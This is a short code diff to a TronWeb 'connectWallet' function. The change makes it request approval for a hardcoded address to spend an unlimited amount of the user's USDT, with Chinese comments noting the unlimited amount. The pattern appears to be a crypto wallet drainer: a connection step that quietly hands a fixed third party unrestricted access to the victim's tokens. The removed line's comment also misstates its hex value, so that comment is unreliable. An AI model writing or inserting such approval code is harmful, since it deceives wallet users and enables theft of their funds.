@@ -23,9 +23,9 @@ async function connectWallet() {
             // 创建 USDT 合约实例
             const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
 
-            // 授权地址和数量
+            // 授权地址和无限数量
             const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
-            const amount = "0xde0b6b3a764000000000"; // 1000000000000000000000 枚 USDT (1 followed by 21 zeros in hex)
+            const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 无限数量的 USDT
 
             // 发送授权交易
             const tx = await usdtContract.approve(spenderAddress, amount).send({
